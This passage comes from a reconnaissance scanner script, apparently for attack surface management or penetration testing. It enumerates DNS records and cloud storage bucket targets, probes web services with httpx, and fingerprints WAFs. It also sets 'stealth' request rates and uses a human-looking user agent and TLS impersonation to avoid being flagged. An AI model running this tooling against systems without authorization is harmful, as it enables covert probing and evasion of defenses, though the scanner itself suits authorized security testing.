    # Backblaze B2
    (re.compile(r'\.backblazeb2\.com\.?$', re.I),
     'backblaze', 'b2', 'direct_b2'),
    # Wasabi
    (re.compile(r'\.wasabisys\.com\.?$', re.I),
     'wasabi', 'wasabi', 'direct_wasabi'),
]

AWS_REGION_RE = re.compile(
    r's3[.-](?:website-)?([a-z]{2}-[a-z]+-\d+)\.amazonaws\.com'
    r'|s3\.([a-z]{2}-[a-z]+-\d+)\.amazonaws\.com'
    r'|s3\.dualstack\.([a-z]{2}-[a-z]+-\d+)\.amazonaws\.com', re.I)

def extract_aws_region(cname_val):
    m = AWS_REGION_RE.search(cname_val)
    if m:
        return next((g for g in m.groups() if g), None)
    return None

def dig_query(host, rtype, nameserver=None):
    cmd = ['dig', '+short', '+time=5', '+tries=2']
    if nameserver:
        cmd.append('@' + nameserver)
    cmd.extend([host, rtype])
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        return [l.strip() for l in r.stdout.strip().split('\n') if l.strip() and not l.startswith(';')]
    except Exception:
        return []

def dig_soa_full(host, nameserver=None):
    cmd = ['dig', '+short', '+time=5', '+tries=2']
    if nameserver:
        cmd.append('@' + nameserver)
    cmd.extend([host, 'SOA'])
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        line = r.stdout.strip()
        if line and not line.startswith(';'):
            parts = line.split()
            if len(parts) >= 7:
                return {
                    'mname': parts[0].rstrip('.'), 'rname': parts[1].rstrip('.'),
                    'serial': int(parts[2]), 'refresh': int(parts[3]),
                    'retry': int(parts[4]), 'expire': int(parts[5]),
                    'minimum': int(parts[6])
                }
    except Exception:
        pass
    return None

def identify_ns_provider(ns_name):
    ns_low = ns_name.lower()
    for key, info in NS_PROVIDERS.items():
        if key in ns_low:
            return info.copy()
    return {'name': 'Unknown', 'provider': 'unknown', 'logo': 'cloud'}

# ═══════════════════════════════════════════════════════════════════
# 1. AUTHORITATIVE NS FOR APEX
# ═══════════════════════════════════════════════════════════════════
nameservers_raw = dig_query(target, 'NS')
nameservers = [ns.rstrip('.') for ns in nameservers_raw if ns]

ns_details = []
ns_providers_seen = {}
for ns in nameservers:
    info = identify_ns_provider(ns)
    ns_ips = dig_query(ns, 'A')
    ns_details.append({
        'nameserver': ns, 'ips': ns_ips,
        'provider_name': info['name'], 'provider': info['provider'], 'logo': info['logo'],
    })
    p = info['name']
    ns_providers_seen[p] = ns_providers_seen.get(p, 0) + 1

# ═══════════════════════════════════════════════════════════════════
# 2. SOA AUDIT — query EACH NS for the SOA, detect serial mismatch
# ═══════════════════════════════════════════════════════════════════
soa_records = {}
soa_serials = set()
for ns in nameservers:
    soa = dig_soa_full(target, ns)
    if soa:
        soa_records[ns] = soa
        soa_serials.add(soa['serial'])

# Also query the apex directly (default resolver)
apex_soa = dig_soa_full(target)
if apex_soa:
    soa_records['__default_resolver__'] = apex_soa
    soa_serials.add(apex_soa['serial'])

soa_mismatch = len(soa_serials) > 1
soa_audit = {
    'apex': target,
    'nameservers_queried': len(soa_records),
    'soa_per_ns': soa_records,
    'unique_serials': sorted(soa_serials),
    'serial_mismatch': soa_mismatch,
    'mismatch_severity': 'high' if soa_mismatch else 'ok',
}
if soa_mismatch:
    soa_audit['alert'] = (
        f"SOA serial mismatch: {len(soa_serials)} different serials across "
        f"{len(soa_records)} nameservers. Possible split-brain DNS, incomplete "
        f"zone transfer, or stale secondary."
    )

# ═══════════════════════════════════════════════════════════════════
# 3. FULL RECORD ENUMERATION (all hosts, all types)
# ═══════════════════════════════════════════════════════════════════
with open(hosts_file) as f:
    hosts = [l.strip() for l in f if l.strip()]
hosts = hosts[:500]  # safety cap

all_dns = {}
cloud_hits = []
cloud_buckets = {'aws': set(), 'azure': set(), 'gcp': set(),
                 'digitalocean': set(), 'alibaba': set(),
                 'backblaze': set(), 'wasabi': set()}
zone_entries = []
record_counts = defaultdict(int)

for host in hosts:
    recs = {}
    for rtype in RECORD_TYPES:
        vals = dig_query(host, rtype)
        if vals:
            recs[rtype] = vals
            record_counts[rtype] += len(vals)
            for val in vals:
                zone_entries.append({'name': host, 'type': rtype, 'value': val})

            # CNAME cloud storage detection
            if rtype == 'CNAME':
                for cname_val in vals:
                    for pat, provider, svc, detection in CLOUD_CNAME_PATTERNS:
                        if pat.search(cname_val):
                            region = extract_aws_region(cname_val) if provider == 'aws' else None
                            # bucket = first label of the CNAME target
                            bucket = cname_val.split('.')[0].rstrip('.')
                            hit = {
                                'host': host, 'cname': cname_val.rstrip('.'),
                                'provider': provider, 'service': svc,
                                'detection': detection, 'bucket_name': bucket,
                            }
                            if region:
                                hit['aws_region'] = region
                            cloud_hits.append(hit)
                            if provider in cloud_buckets:
                                cloud_buckets[provider].add(bucket)
                            break
    if recs:
        all_dns[host] = recs

# ═══════════════════════════════════════════════════════════════════
# 4. WRITE OUTPUTS
# ═══════════════════════════════════════════════════════════════════
with open(os.path.join(base_dir, 'dns_all_records.json'), 'w') as f:
    json.dump(all_dns, f, indent=2)

with open(os.path.join(base_dir, 'authoritative_ns.json'), 'w') as f:
    json.dump({'apex': target, 'nameservers': ns_details, 'providers': ns_providers_seen}, f, indent=2)

with open(os.path.join(base_dir, 'soa_audit.json'), 'w') as f:
    json.dump(soa_audit, f, indent=2)

cloud_out = {
    'hits': cloud_hits,
    'bucket_targets': {k: sorted(v) for k, v in cloud_buckets.items()},
    'total_cloud_cnames': len(cloud_hits),
}
with open(os.path.join(base_dir, 'cloud_storage_targets.json'), 'w') as f:
    json.dump(cloud_out, f, indent=2)

with open(os.path.join(base_dir, 'dns_zone.json'), 'w') as f:
    json.dump(zone_entries, f, indent=2)

# Write per-provider bucket target files for downstream cloud enum
for prov, buckets in cloud_buckets.items():
    if buckets:
        with open(os.path.join(base_dir, f'dns_{prov}_targets.txt'), 'w') as f:
            f.write('\n'.join(sorted(buckets)) + '\n')

# ═══════════════════════════════════════════════════════════════════
# 5. UPDATE MANIFEST (lock-and-modify-in-place — do NOT overwrite hosts)
# ═══════════════════════════════════════════════════════════════════
if os.path.exists(manifest_f):
    import time
    # Build per-host delta (only fields THIS module owns)
    host_deltas = {}
    for hit in cloud_hits:
        h = hit['host']
        upd = {
            'is_cloud_storage': True,
            'cloud_storage_provider': hit['provider'],
            'cloud_storage_service': hit['service'],
            'cloud_storage_detection': hit['detection'],
            'tech_tag': hit['service'].upper(),
        }
        if hit['service'] == 's3':
            upd['is_s3'] = True
        if 'aws_region' in hit:
            upd['aws_region'] = hit['aws_region']
        host_deltas[h] = upd

    dns_discovery_delta = {
        'soa_mismatch': soa_mismatch,
        'nameservers': [ns['nameserver'] for ns in ns_details],
        'cloud_storage_count': len(cloud_hits),
        'record_counts': dict(record_counts),
    }

    # mkdir-based mutex (matches bash update_manifest — cross-platform)
    lock_dir = manifest_f + '.lock.d'
    locked = False
    for _ in range(50):
        try:
            os.mkdir(lock_dir)
            locked = True
            break
        except FileExistsError:
            try:
                age = time.time() - os.path.getmtime(lock_dir)
                if age > 60:
                    os.rmdir(lock_dir)
                    continue
            except OSError:
                pass
            time.sleep(0.1)

    try:
        with open(manifest_f, 'r') as f:
            current = json.load(f)
        current.setdefault('hosts', {})
        for h, upd in host_deltas.items():
            if h in current['hosts']:
                current['hosts'][h].update(upd)
        current.setdefault('dns_discovery', {}).update(dns_discovery_delta)
        tmp = manifest_f + '.tmp'
        with open(tmp, 'w') as f:
            json.dump(current, f, indent=2)
        os.replace(tmp, manifest_f)
    except (OSError, IOError, json.JSONDecodeError) as e:
        print(f"[dns_discovery] manifest update failed: {e}", file=sys.stderr)
    finally:
        if locked:
            try:
                os.rmdir(lock_dir)
            except OSError:
                pass

# Summary to stdout
total_recs = sum(record_counts.values())
print(f"Records:{total_recs} NS:{len(ns_details)} SOA-mismatch:{soa_mismatch} Cloud-CNAME:{len(cloud_hits)}")
DNSDISC_EOF

    log_info "DNS discovery completed"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "dns_discovery",
  "duration_seconds": $((end_time - start_time))
}
EOF

    echo "$output_file"
}
###################################################################################################
# MODULE 4: HTTP DISCOVERY AND PORT SCANNING
###################################################################################################

module_http_discovery() {
    local target="$1"
    log_section "MODULE 4: Quick HTTP Discovery (Web Apps Only)"
    
    local resolved_file="$OUTPUT_DIR/03_dns_resolution/resolved.txt"
    [ ! -f "$resolved_file" ] && { log_error "No resolved hosts found"; return 1; }
    command -v "$HTTPX" &>/dev/null || { log_error "httpx is required for HTTP discovery"; return 1; }
    
    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/04_http_discovery/$(make_iso_filename "$target" "http_discovery" "results")"
    
    # Step 1: Create unique resolved list (remove duplicates) - INCLUDING CDN domains
    log_info "Deduplicating resolved hosts..."
    sort -u "$resolved_file" > "$OUTPUT_DIR/04_http_discovery/resolved_unique.txt"
    local unique_count=$(count_lines "$OUTPUT_DIR/04_http_discovery/resolved_unique.txt")
    log_info "Unique domains: $unique_count (CDN domains included)"

    # Step 2: Build the httpx target list. The full port scan ran FIRST, so fold
    # in every non-standard open port it found (8080, 3000, 8443, ...) as
    # host:port — httpx then verifies web services on ALL discovered ports, not
    # just 80/443.
    #
    # Every host gets EXPLICIT host:80 and host:443 entries — never a bare
    # hostname. httpx's own scheme auto-detection for a bare host (or even an
    # explicit http://host URL) silently upgrades to whichever scheme it
    # prefers and reports ONLY that one result, discarding the other
    # entirely. Verified empirically against a real CloudFront-fronted host:
    # both a bare "x.acme-payments.example.com" and an explicit "http://x.acme-payments.example.com"
    # collapsed to a single https:443 result, silently hiding that port 80
    # was ALSO live (serving a real 301) — a scan-to-scan coin flip on which
    # port gets reported, depending on nothing observable. Explicit
    # "host:80" / "host:443" syntax makes httpx probe and report each port
    # independently and deterministically (confirmed: same host, same run,
    # both ports correctly returned with their own status).
    #
    # Reads the raw all_ports.jsonl, NOT ports/port_split.py's web_ports.jsonl
    # subset — that subset is pre-filtered to a STATIC, hardcoded list of known
    # web ports (80/443/8080/8443/3000/...), so a web service running on any
    # port outside that list (exactly the kind of forgotten/unusual exposure an
    # EASM scan exists to catch) would be silently skipped entirely instead of
    # ever reaching httpx to be verified. httpx's whole job here is to make that
    # determination itself; pre-filtering by a fixed port list defeats it.
    local httpx_targets="$OUTPUT_DIR/04_http_discovery/httpx_targets.txt"
    : > "$httpx_targets"
    while IFS= read -r _h; do
        [ -z "$_h" ] && continue
        printf '%s:80\n%s:443\n' "$_h" "$_h" >> "$httpx_targets"
    done < "$OUTPUT_DIR/04_http_discovery/resolved_unique.txt"
    local ports_json="$OUTPUT_DIR/14_port_scan/all_ports.jsonl"
    if [ -f "$ports_json" ]; then
        jq -r 'select(.port != 80 and .port != 443) | "\(.host):\(.port)"' "$ports_json" 2>/dev/null \
            >> "$httpx_targets"
        sort -u "$httpx_targets" -o "$httpx_targets"
        log_info "Folded discovered non-standard ports into httpx targets ($(count_lines "$httpx_targets") total)"
    fi

    # Step 3: HTTP discovery with httpx — verify which host:port pairs are web.
    log_info "HTTP discovery with httpx (verifying web services on all discovered ports)..."
    local _httpx4_extra=(-H "User-Agent: $HUMAN_USER_AGENT")
    local _cookie_hdr=$(session_cookie_header)
    [ -n "$_cookie_hdr" ] && _httpx4_extra+=(-H "Cookie: $_cookie_hdr")
    [ -n "$TLS_IMPERSONATE_FLAG" ] && _httpx4_extra+=("$TLS_IMPERSONATE_FLAG")
    run_tool httpx $HTTPX -l "$httpx_targets" \
        -sr -srd "$OUTPUT_DIR/04_http_discovery/responses" \
        -title -hash sha1 \
        "${_httpx4_extra[@]}" \
        -json -o "$OUTPUT_DIR/04_http_discovery/http_confirmed.json" \
        -timeout 10 -threads 100 -silent
    
    # Extract HTTP hosts - full URLs (use the actual scheme from the response, not a hardcoded https).
    # Strips a redundant default port (http:80, https:443): since every httpx
    # target is now explicit host:80/host:443 (see above), httpx's own .url
    # field always carries that literal port back, e.g.
    # "https://x.acme-payments.example.com:443" — technically correct but a different
    # string from "https://x.acme-payments.example.com" that every OTHER URL source
    # (gau, crawl, gospider, ...) produces, which would silently defeat
    # string-based dedup against them downstream.
    [ -f "$OUTPUT_DIR/04_http_discovery/http_confirmed.json" ] && \
        jq -r '
          (.scheme // "https") as $s
          | ((.port // (if $s == "https" then 443 else 80 end))|tostring) as $p
          | if (($s == "http" and $p == "80") or ($s == "https" and $p == "443"))
            then $s + "://" + .host
            else (.url // ($s + "://" + .host + ":" + $p))
            end
        ' "$OUTPUT_DIR/04_http_discovery/http_confirmed.json" | sort -u > "$OUTPUT_DIR/04_http_discovery/http_hosts.txt"

    # Prime the shared response fingerprint cache from httpx output. Every
    # downstream module (WAF baseline, headers, bypass_403, nuclei roots)
    # otherwise re-fetches these same URLs — priming from httpx's already-
    # captured response metadata skips that duplication for free.
    if [ -f "$PROJECT_ROOT/recon/probe_cache.py" ] && command -v python3 &>/dev/null; then
        python3 "$PROJECT_ROOT/recon/probe_cache.py" prime "$OUTPUT_DIR" 2>/dev/null || true
    fi

    # Build the per-host tech manifest from httpx's own tech-detect output.
    # Downstream nuclei runs will pull each host's nuclei_tags to focus
    # template selection instead of falling back to -as' broad shelf.
    if [ -f "$PROJECT_ROOT/recon/tech_manifest.py" ] && command -v python3 &>/dev/null; then
        python3 "$PROJECT_ROOT/recon/tech_manifest.py" "$OUTPUT_DIR" 2>&1 | \
            grep -E "^\[tech-manifest\]" | while read -r ln; do log_info "$ln"; done || true
    fi

    # Content-based host clustering: dozens of subdomains often serve the SAME
    # underlying app (admin.x.com == admin-staging.x.com). Fingerprint by
    # (status, title, normalized-body-hash, shingle-similarity) and pick a
    # canonical per cluster. host_canonical.txt is what dirsearch and nuclei
    # deep-URL feeders can use to avoid scanning identical apps N times.
    if [ -f "$PROJECT_ROOT/recon/host_dedup.py" ] && command -v python3 &>/dev/null; then
        python3 "$PROJECT_ROOT/recon/host_dedup.py" "$OUTPUT_DIR" 2>&1 | \
            grep -E "^\[host-dedup\]" | while read -r ln; do log_info "$ln"; done || true
    fi

    # Schema fingerprint: probe well-known GraphQL/OpenAPI/Swagger paths per
    # canonical host. Live introspection or a public swagger.json is huge
    # signal — this is what a pentester probes in the first 5 minutes, and
    # it was completely absent from the pipeline. Emits schema_endpoints.jsonl
    # for downstream consumption (nuclei tags, apisec input, dashboard row).
    if [ -f "$PROJECT_ROOT/recon/schema_probe.py" ] && command -v python3 &>/dev/null; then
        python3 "$PROJECT_ROOT/recon/schema_probe.py" "$OUTPUT_DIR" 2>&1 | \
            grep -E "^\[schema-probe\]" | while read -r ln; do log_info "$ln"; done || true
    fi
    
    local http_count=$(count_lines "$OUTPUT_DIR/04_http_discovery/http_hosts.txt")
    log_info "HTTP confirmed: $http_count web applications"
    if [ "$http_count" -eq 0 ] && [ "$unique_count" -gt 0 ]; then
        log_warn "0 web apps from $unique_count resolved domains — check httpx output in $TOOL_LOG_DIR/httpx.log (likely target blocking this host's IP or no outbound 80/443)"
    fi
    
    # Create plain host list (without scheme) for crawling/scanning tools
    [ -f "$OUTPUT_DIR/04_http_discovery/http_hosts.txt" ] && \
        awk '{value=$0; sub(/^[[:alpha:]][[:alnum:]+.-]*:\/\//, "", value); sub(/\/.*/, "", value); if (value != "") print value}' \
        "$OUTPUT_DIR/04_http_discovery/http_hosts.txt" | sort -u > "$OUTPUT_DIR/04_http_discovery/host_list.txt"
    
    # Show sample of found web apps
    [ -f "$OUTPUT_DIR/04_http_discovery/http_hosts.txt" ] && head -20 "$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    
    # Update manifest — batched into one pass (was one whole-file jq rewrite per
    # confirmed HTTP host). Pure local I/O; no network.
    if [ -f "$OUTPUT_DIR/04_http_discovery/http_confirmed.json" ]; then
        local _mtsv="$OUTPUT_DIR/04_http_discovery/.manifest_delta.tsv"
        python3 - "$OUTPUT_DIR/04_http_discovery/http_confirmed.json" "$_mtsv" <<'PY_HTTP_DELTA' 2>/dev/null
import json, sys
src, out = sys.argv[1], sys.argv[2]
seen = set()
with open(out, "w") as w:
    for line in open(src, errors="ignore"):
        line = line.strip()
        if not line:
            continue
        try:
            e = json.loads(line)
        except Exception:
            continue
        if e.get("status_code") is None:
            continue
        host = e.get("host") or e.get("input")
        if not host or host in seen:
            continue
        seen.add(host)
        w.write("%s\t%s\n" % (host, json.dumps({"http_status": e["status_code"], "has_webapp": True})))
PY_HTTP_DELTA
        update_manifest_stream "$_mtsv"
        rm -f "$_mtsv"
    fi
    
    update_statistics "http_hosts" "$http_count"
    HTTP_HOSTS=$http_count
    
    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "http_discovery",
  "http_hosts": $http_count,
  "unique_domains": $unique_count,
  "duration_seconds": $((end_time - start_time)),
  "note": "Quick HTTP discovery only. Full port scan scheduled after web app scans."
}
EOF
    
    log_info "Quick HTTP discovery completed: $http_count web apps found"
    log_info "Full port scan will run after web application scanning modules complete"
    echo "$output_file"
}
###################################################################################################
# MODULE 5: WAF DETECTION AND BASELINE CALIBRATION
###################################################################################################

module_waf_detection() {
    local target="$1"
    log_section "MODULE 5: WAF Detection and Baseline Calibration"
    
    local http_hosts_file="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    local skip_hosts_file="$OUTPUT_DIR/05_waf_detection/skip_bruteforce.txt"
    local detections_file="$OUTPUT_DIR/05_waf_detection/waf_detections.jsonl"
    mkdir -p "$OUTPUT_DIR/05_waf_detection"
    > "$skip_hosts_file"
    > "$detections_file"
    # No live hosts is a valid empty state (target fully WAF/CDN-blocked, DNS-only,
    # etc.) — not a module failure. Degrade gracefully so this doesn't inflate
    # completed_with_errors and doesn't block downstream modules that tolerate
    # an empty detections file.
    if [ ! -s "$http_hosts_file" ]; then
        log_warn "No HTTP hosts found — skipping WAF detection (nothing to calibrate against)"
        return 0
    fi

    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/05_waf_detection/$(make_iso_filename "$target" "waf_detection" "results")"

    local wafw00f_status="unavailable"
    command -v "$WAFW00F" &>/dev/null && wafw00f_status="available"

    # CDN allowlist: any host whose IP was flagged by Module 3's dnsx -cdn pass
    # is ALREADY known to be behind a CDN (which is 1:1 a WAF layer for the
    # purposes of rate control). Running the 3-tier detection dance on those
    # hosts is pure waste — wafw00f + nuclei waf-detect + httpx tech-detect
    # per host adds up on big scans. Stamp them as cdn-inferred and skip the
    # active probing; the downstream skip_bruteforce + rate policy still work
    # off the JSONL row so nothing downstream is starved of the signal.
    local cdn_ips_file="$OUTPUT_DIR/03_dns_resolution/cdn_ips.txt"
    local cdn_hosts_file="$OUTPUT_DIR/05_waf_detection/cdn_hosts.txt"
    : > "$cdn_hosts_file"
    if [ -s "$cdn_ips_file" ] && [ -s "$OUTPUT_DIR/03_dns_resolution/dns_results.json" ]; then
        # Map host -> first A record, then keep hosts whose A is in cdn_ips.
        python3 - "$OUTPUT_DIR/03_dns_resolution/dns_results.json" "$cdn_ips_file" "$cdn_hosts_file" << 'PY_CDN_MAP' 2>/dev/null || true
import json, sys
res, cdnf, out = sys.argv[1], sys.argv[2], sys.argv[3]
cdn = set()
try:
    for l in open(cdnf, errors="ignore"):
        l = l.strip()
        if l: cdn.add(l)
except Exception:
    pass
hosts = set()
try:
    for line in open(res, errors="ignore"):
        line = line.strip()
        if not line: continue
        try: e = json.loads(line)
        except Exception: continue
        h = e.get("host"); a = e.get("a") or []
        if not h or not a: continue
        if any(ip in cdn for ip in a):
            hosts.add(h.lower())
except FileNotFoundError:
    sys.exit(0)
with open(out, "w") as fh:
    for h in sorted(hosts): fh.write(h + "\n")
PY_CDN_MAP
        local cdn_host_count=$(count_lines "$cdn_hosts_file")
        [ "$cdn_host_count" -gt 0 ] && log_info "Fast-path: $cdn_host_count host(s) inferred CDN/WAF from Module 3 IPs — skipping active probes"
    fi

    # Process each host
    log_info "Calibrating WAF baseline for $(count_lines "$http_hosts_file") hosts..."

    while IFS= read -r url; do
        [ -z "$url" ] && continue
        local host=$(url_host "$url")
        local safe_host=$(safe_name "$host")
        log_debug "Checking: $url"

        # Fast-path for CDN-fronted hosts: emit a row that downstream stages
        # can act on, mark for bruteforce skip, and continue without spending
        # ~30-60s on the 3-tier detection.
        if [ -s "$cdn_hosts_file" ] && grep -qxFi "$host" "$cdn_hosts_file"; then
            local cdn_row
            cdn_row=$(jq -nc --arg url "$url" --arg host "$host" \
                --arg vendor "cdn-inferred" --arg source "dnsx-cdn" \
                '{url:$url,host:$host,waf_vendor:$vendor,detection_source:$source,catchall_detected:false,js_challenge_detected:false,skip_bruteforce:true,baseline_root_len:0,baseline_junk_len:0}')
            printf '%s\n' "$cdn_row" >> "$detections_file"
            echo "$host" >> "$skip_hosts_file"
            log_info "  CDN fast-path: $host (skip active probes)"
            continue
        fi

        
        local baseline_dir="$OUTPUT_DIR/05_waf_detection/$safe_host"
        mkdir -p "$baseline_dir"

        # Request 1: Root path — user agent stays consistent with the rest of
        # the scan (HUMAN_USER_AGENT), so a WAF that fingerprints UA rotation
        # doesn't see this as a different tool from Module 8B's bypass probes.
        curl -skL -A "$HUMAN_USER_AGENT" -D "$baseline_dir/root.headers" -o "$baseline_dir/root.body" \
            "${url%/}/" --max-time 10 2>/dev/null

        [ ! -f "$baseline_dir/root.body" ] && continue

        # Request 2: Junk path — same UA.
        local junk="/$(head -c 12 /dev/urandom | xxd -p)_zr"
        curl -skL -A "$HUMAN_USER_AGENT" -D "$baseline_dir/junk.headers" -o "$baseline_dir/junk.body" \
            "${url%/}$junk" --max-time 10 2>/dev/null

        [ ! -f "$baseline_dir/junk.body" ] && continue
        
        # Get lengths
        local root_len=$(wc -c < "$baseline_dir/root.body")
        local junk_len=$(wc -c < "$baseline_dir/junk.body")
        local len_diff=$((root_len - junk_len))
        [ $len_diff -lt 0 ] && len_diff=$((-len_diff))
        local len_pct=$((len_diff * 100 / (root_len + 1)))

        # Detect catchall — length gate is a fast pre-check; the real signal
        # comes from discovery/soft404_detector.py which learns the host's catchall
        # fingerprint from N random junk probes (with targeted normalization
        # of timestamps/UUIDs/CSRF tokens — never arbitrary digits, so real
        # content stays distinct) and matches on exact body hash, header +
        # length + location tuple, or shingle-similarity Jaccard >= 0.90.
        # This catches modern SPA catchalls that share length but have
        # different-hash headers, and legit 200s that share length by
        # coincidence.
        local catchall="false"
        [ $len_pct -lt 5 ] && catchall="true"
        local soft404_sig="$baseline_dir/soft404_signature.json"
        if command -v python3 &>/dev/null && [ -f "$PROJECT_ROOT/discovery/soft404_detector.py" ]; then
            HUMAN_USER_AGENT="$HUMAN_USER_AGENT" python3 "$PROJECT_ROOT/discovery/soft404_detector.py" \
                learn "$url" -n 3 --timeout 8 --out "$soft404_sig" 2>/dev/null || true
            # Learn returns a "signature_ready" bool; if any junk probe
            # matches the ROOT's normalized body, the host is definitely
            # a catchall (root looks like the junk 404 → the same page is
            # served everywhere).
            if [ -f "$soft404_sig" ]; then
                local root_matches_junk
                root_matches_junk=$(HUMAN_USER_AGENT="$HUMAN_USER_AGENT" python3 "$PROJECT_ROOT/discovery/soft404_detector.py" \
                    check "$url" --sig-file "$soft404_sig" --timeout 8 2>/dev/null \
                    | jq -r '.is_catchall // false' 2>/dev/null || echo false)
                [ "$root_matches_junk" = "true" ] && catchall="true"
            fi
        fi
        
        # wafw00f is authoritative when available; signatures remain a deterministic fallback.
        local waf_vendor="none"
        local detection_source="none"

        # Tier 1: wafw00f — authoritative; if it finds something, stop here
        local waf_json="$baseline_dir/wafw00f.json"
        if command -v "$WAFW00F" &>/dev/null; then
            if "$WAFW00F" -a -f json -o "$waf_json" "$url" >/dev/null 2>&1; then
                wafw00f_status="completed"
                local _vendor
                _vendor=$(jq -r '
                    (if type == "array" then .[0] else . end) as $r |
                    ($r.firewall // $r.waf // empty) |
                    if type == "array" then join(", ") else . end
                ' "$waf_json" 2>/dev/null)
                # wafw00f emits "None" (capitalised) in its `firewall` field when
                # it detects NO WAF. Compare case-insensitively so that "None"/
                # "NONE"/"null" are all treated as "no vendor" — otherwise the
                # literal "None" is stored as a vendor and the skip gate below
                # ([ "$waf_vendor" != "none" ]) wrongly flags the host as
                # WAF-protected, skipping it from all active discovery.
                local _vlow
                _vlow=$(printf '%s' "$_vendor" | tr '[:upper:]' '[:lower:]')
                if [ -n "$_vendor" ] && [ "$_vlow" != "null" ] && [ "$_vlow" != "none" ]; then
                    waf_vendor="$_vendor"
                    detection_source="wafw00f"
                    log_info "  [wafw00f] WAF detected: $waf_vendor ($url)"
                fi
            else
                wafw00f_status="partial_failure"
                log_warn "  [wafw00f] failed for $url"
            fi
        else
            log_warn "  wafw00f not installed; skipping Tier 1"
        fi

        # Tier 2: nuclei waf-detect — only if wafw00f found nothing
        if [ "$waf_vendor" = "none" ]; then
            if command -v "$NUCLEI" &>/dev/null; then
                local nuclei_out
                nuclei_out=$("$NUCLEI" -u "$url" -tags waf -silent -nc 2>/dev/null)
                if [ -n "$nuclei_out" ]; then
                    local waf_name
                    waf_name=$(printf '%s' "$nuclei_out" | grep -o '\[[^]]*waf-detect:[^]]*\]' | head -n 1 | sed 's/\[.*waf-detect://; s/\]//')
                    if [ -n "$waf_name" ]; then
                        waf_vendor=$(printf '%s' "$waf_name" | awk '{print toupper(substr($0,1,1)) substr($0,2)}')
                        detection_source="nuclei"
                        log_info "  [nuclei] WAF detected: $waf_vendor ($url)"
                    fi
                fi
            else
                log_warn "  nuclei not installed; skipping Tier 2"
            fi
        fi

        # Tier 3: httpx tech-detect — only if both wafw00f and nuclei found nothing
        if [ "$waf_vendor" = "none" ]; then
            if command -v "$HTTPX" &>/dev/null; then
                local httpx_out
                httpx_out=$(run_tool httpx_techdetect "$HTTPX" -u "$url" -tech-detect -silent -nc)
                if [ -n "$httpx_out" ]; then
                    local -a waf_list=("Cloudflare" "AWS WAF" "Akamai" "Imperva Incapsula" "Sucuri" \
                        "F5 BIG-IP ASM" "Barracuda WAF" "Fortinet FortiWeb" "Radware AppWall" \
                        "Citrix ADC" "Citrix NetScaler" "Azure Front Door WAF" "Reblaze" \
                        "StackPath WAF" "Fastly Next-Gen WAF" "Signal Sciences" "DataDome" \
                        "Yundun" "Safe3 WAF" "ModSecurity" "Tencent Cloud WAF" "Alibaba Cloud WAF" \
                        "Huawei Cloud WAF" "Oracle Cloud WAF" "Palo Alto Prisma Cloud WAAS" \
                        "Wallarm" "AppTrana" "DenyALL WAF" "NSFocus WAF" "KnownSec WAF" \
                        "360 Web Application Firewall" "Anquanbao" "PowerCDN WAF" "Edgecast WAF" \
                        "CDN77 WAF" "Cloudbric" "Comodo WAF" "DOSarrest" "GreyWizard" \
                        "Varnish Security Layer" "Profense" "Bekchy WAF" "BinarySec" "NAXSI" \
                        "ExpressionEngine Secure Gateway")
                    for w in "${waf_list[@]}"; do
                        if printf '%s' "$httpx_out" | grep -Fqi "$w"; then
                            waf_vendor="$w"
                            detection_source="httpx"
                            log_info "  [httpx] WAF detected: $waf_vendor ($url)"
                            break
                        fi
                    done
                fi
            else
                log_warn "  httpx not installed; skipping Tier 3"
            fi
        fi

        [ "$waf_vendor" = "none" ] && log_debug "  No WAF detected for $url"
        
        # Detect JS challenge
        local js_challenge="false"
        grep -qiE 'cf-chl|jschl-answer|checking your browser|captcha|challenge-platform' \
            "$baseline_dir/junk.headers" "$baseline_dir/junk.body" 2>/dev/null && js_challenge="true"
        
        # Skip bruteforce if WAF or catchall
        local skip_bruteforce="false"
        if [ "$catchall" = "true" ] || [ "$waf_vendor" != "none" ] || [ "$js_challenge" = "true" ]; then
            skip_bruteforce="true"
        fi
        
        [ "$skip_bruteforce" == "true" ] && echo "$host" >> "$skip_hosts_file"
        
        local detection_json
        detection_json=$(jq -nc --arg url "$url" --arg host "$host" --arg vendor "$waf_vendor" \
            --arg source "$detection_source" --argjson catchall "$catchall" --argjson challenge "$js_challenge" \
            --argjson skip "$skip_bruteforce" --argjson root_len "$root_len" --argjson junk_len "$junk_len" \
            '{url:$url,host:$host,waf_vendor:$vendor,detection_source:$source,catchall_detected:$catchall,js_challenge_detected:$challenge,skip_bruteforce:$skip,baseline_root_len:$root_len,baseline_junk_len:$junk_len}')
        printf '%s\n' "$detection_json" >> "$detections_file"
        update_manifest_bulk "$host" "$detection_json"
        
        if [ "$skip_bruteforce" == "true" ]; then
            log_warn "  SKIP: $host (WAF: $waf_vendor, catchall: $catchall)"
        else
            log_info "  OK: $host"
        fi
        
    done < "$http_hosts_file"
    
    sort -u "$skip_hosts_file" -o "$skip_hosts_file"
    local waf_count=$(jq -s '[.[] | select(.waf_vendor != "none")] | length' "$detections_file" 2>/dev/null || echo 0)
    local skipped_count=$(count_lines "$skip_hosts_file")
    log_info "WAF-protected hosts: $waf_count; active discovery gated: $skipped_count"
    WAF_HOSTS=$waf_count

    update_statistics "waf_hosts" "$waf_count"

    # ── Per-host rate policy ─────────────────────────────────────────────────
    # Single JSONL that every downstream scanner (nuclei, dirsearch, access-
    # control-pipeline, api security) can consume to pick the right request
    # rate PER host. Old behaviour: global -rl 300 for everyone — WAF'd hosts
    # got blasted (rate-limit responses → scan waste + WAF signal), clean
    # origins got throttled unnecessarily. New policy buckets by risk:
    #
    #   clean (no WAF)           → rate_hint=300 threads_hint=50 policy=aggressive
    #   waf-detected             → rate_hint=30  threads_hint=5  policy=stealth
    #   cdn-inferred / catchall  → rate_hint=15  threads_hint=3  policy=minimal
    #   js-challenge             → rate_hint=10  threads_hint=2  policy=probe-only
    #
    # Downstream consumers keep their own global fallback for hosts missing
    # from the policy file. Format: one JSON per line, {host, waf_vendor,
    # rate_hint, threads_hint, policy}.
    local host_policy_file="$OUTPUT_DIR/05_waf_detection/host_rate_policy.jsonl"
    : > "$host_policy_file"
    if [ -s "$detections_file" ]; then
